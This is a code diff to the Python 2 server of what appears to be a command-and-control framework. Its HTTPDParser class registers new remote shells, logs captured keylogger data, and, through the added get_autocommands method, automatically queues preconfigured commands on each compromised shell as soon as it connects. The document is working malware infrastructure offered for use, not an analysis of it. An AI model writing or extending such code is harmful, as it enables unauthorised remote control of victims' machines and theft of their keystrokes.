@@ -4,6 +4,7 @@
 """
 from core.log import Log
 from core.ui import UI
+from core.utils import Utils
 
 class HTTPDParser:
     
@@ -39,14 +40,25 @@ class HTTPDParser:
         UI.success("Registering new shell %s" % prompt)
         UI.success("New shell ID %s GUID is %s" % (index, guid))
         Log.log_event("New Shell", data)
+	self.get_autocommands(guid)
 
     def hello(self, guid, data):
         self.output = self.db.get_cmd(guid)
 
     def ping(self, guid, data):
+	# not used for the moment every callback act as a ping
 	self.output = "pong"
 
     def keylogger(self, guid, data):
 	cmd, guid, data = data.split(" ", 2)
 	Log.append_keylogger_data(guid, data)
 	Log.log_event("Keylogger", "Data received (%s)" % (guid))
+
+    def get_autocommands(self, guid):
+	profile = self.config.get("profile")
+	commands = profile.get("autocommands")
+	if isinstance(commands, list):
+		UI.success("Running auto commands on shell %s" % guid)
+		for command in commands:
+			print "[+] %s" % command
+			self.db.push_cmd(guid, command, Utils.guid(), self.config.get("username"))
